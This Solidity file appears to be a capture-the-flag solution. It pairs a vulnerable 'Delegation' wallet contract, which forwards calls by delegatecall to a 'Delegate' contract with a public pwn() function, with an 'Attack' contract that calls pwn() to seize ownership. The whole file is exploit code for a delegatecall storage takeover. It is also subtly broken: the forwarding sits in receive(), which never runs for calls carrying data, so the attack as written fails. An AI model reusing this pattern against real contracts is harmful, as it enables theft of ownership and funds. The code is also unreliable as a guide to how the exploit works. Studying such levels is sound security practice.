// SPDX-License-Identifier: MIT

/****Og Contract****/

pragma solidity ^0.6.0;

contract Delegate {

  address public owner;

  constructor(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  receive() external payable {
    (bool result, bytes memory data) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}

/****attack Contract****/

contract Attack{
    Delegation instanceAddress;
    
    constructor(address payable _instanceAddress)public{
        instanceAddress = Delegation(_instanceAddress);
    }
    
    function getOwner()public view returns(address){
        return instanceAddress.owner();
    }
    
    function attack()public payable{
        address(instanceAddress).call(abi.encodeWithSignature('pwn()'));
    }
    
}
